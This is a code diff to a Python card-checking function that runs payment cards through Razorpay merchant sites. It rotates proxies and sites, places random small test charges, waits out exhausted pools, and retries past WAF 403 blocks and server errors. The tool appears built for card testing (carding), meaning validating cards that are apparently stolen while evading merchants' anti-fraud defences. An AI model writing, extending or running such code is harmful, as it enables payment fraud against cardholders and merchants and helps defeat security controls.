@@ -235,17 +235,27 @@ def _rz_extra_lines():
 def check_fn(card):
     """Sync single-card check against the Razorpay API (VPS:9000).
 
-    A card is RE-CHECKED on a fresh site/proxy when the current attempt hits a
-    site-level problem (amount constraint, international-only, server error,
-    WAF 403, dead proxy) — so a bad site never wastes the card.
+    A card is RE-CHECKED on a fresh site/proxy on a site-level problem, and
+    WAITS (instead of erroring) when the pool is temporarily exhausted — so the
+    run always produces real results, never "rz_site.txt empty" spam.
     Returns (status, msg, brand, amount_inr) — amount_inr is the actual charge."""
-    for _attempt in range(6):
+    server_error_sites = set()
+    waited = 0
+    for _attempt in range(8):
         site = _next_site()
         if not site:
-            return "ERROR", "No sites loaded (rz_site.txt empty)", "UNKNOWN", 0
+            if waited < 30:
+                time.sleep(3)
+                waited += 3
+                continue
+            return "ERROR", "All sites cooling — retry later", "UNKNOWN", 0
         proxy, lock = _acquire_free_proxy()
         if proxy is None:
-            return "ERROR", "No proxies loaded", "UNKNOWN", 0
+            if waited < 30:
+                time.sleep(3)
+                waited += 3
+                continue
+            return "ERROR", "All proxies cooling — retry later", "UNKNOWN", 0
         try:
             amount = _amount_override or random.randint(23, 100) * 100  # ₹23-100 whole rupees
             q = urllib.parse.urlencode({
@@ -282,8 +292,13 @@ def check_fn(card):
 
             # site soft-block (server error) -> cooldown site, retry
             if "server error" in m or "site issue" in m:
+                server_error_sites.add(_site_key(site))
                 with _site_guard:
                     _site_dead_until[_site_key(site)] = time.time() + SITE_DEAD_COOLDOWN_SECONDS
+                # 2+ different sites server-error for the SAME card => the card
+                # itself is flagged, not the sites. Stop cooling sites, mark dead.
+                if len(server_error_sites) >= 2:
+                    return "DECLINED", "Card flagged — server error across sites", "UNKNOWN", amount_inr
                 continue
 
             # WAF 403 -> hard-pause proxy 15-45 min, retry
